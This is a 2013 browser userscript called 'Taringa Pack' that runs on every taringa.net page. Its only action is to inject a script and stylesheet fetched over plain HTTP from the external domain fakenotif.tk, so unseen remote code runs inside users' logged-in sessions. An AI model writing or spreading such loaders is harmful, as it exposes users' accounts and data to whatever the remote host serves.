// ==UserScript==
// @name       Taringa Pack
// @namespace  http://fakenotif.tk/
// @version    0.1
// @description  Taringa Pack
// @match      http://*.taringa.net/*
// @copyright  2013 Puika Software
// @require http://code.jquery.com/jquery-1.7.min.js
// ==/UserScript==


function init(){

$('head').append("<script src='http://fakenotif.tk/noapto/main.js'></script>");
$('head').append('<link href="http://fakenotif.tk/noapto/main.css" rel="stylesheet" type="text/css">');

}

init();
